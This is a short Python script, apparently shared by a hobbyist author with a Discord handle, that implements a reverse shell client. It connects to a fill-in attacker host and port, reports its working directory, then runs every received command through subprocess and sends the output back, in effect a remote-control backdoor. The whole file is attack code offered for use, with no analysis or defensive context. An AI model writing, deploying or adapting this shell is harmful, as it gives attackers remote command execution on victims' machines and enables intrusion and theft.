import socket
import os
import subprocess

# Created by ~ Asad
# For any kind of help, feel free to Dm me on Discord ~ Asad#2809
# enter the host ip 
server_host = "Your host ip"
# enter the port you are listening to
server_port = port
size = 1024 * 128
seperator = "<sep>"
socket_object = socket.socket()
socket_object.connect((server_host, server_port))
cwd = os.getcwd()
socket_object.send(cwd.encode())

while True:
    command = socket_object.recv(size).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f"{output}{seperator}{cwd}"
    socket_object.send(message.encode())
socket_object.close()
